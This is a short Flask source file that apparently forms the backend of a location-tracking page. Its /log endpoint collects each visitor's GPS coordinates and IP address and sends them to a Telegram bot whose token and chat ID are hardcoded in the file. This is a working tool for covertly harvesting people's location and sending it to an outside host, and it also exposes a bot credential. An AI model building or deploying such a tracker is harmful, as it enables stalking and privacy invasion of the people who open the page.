from flask import Flask, render_template, request, jsonify
import requests
import time
import os

app = Flask(__name__)

TELEGRAM_TOKEN = '8504868188:AAHMKi5FN0L-ALvC24f0Xivp2ZOdqlK59r0'
CHAT_ID = '8139456582'

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
        print("✓ تم الإرسال")
    except:
        print("✗ فشل الإرسال")

@app.route('/alive')
def alive():
    return 'I am awake'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if data.get('status') == "Allowed":
        lat, lon = data.get('lat'), data.get('lon')
        msg = f"📍 {lat},{lon}\n🌐 {ip}"
    else:
        msg = f"⚠️ رفض\n🌐 {ip}"
    
    send_to_telegram(msg)
    return jsonify({"status": "success"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)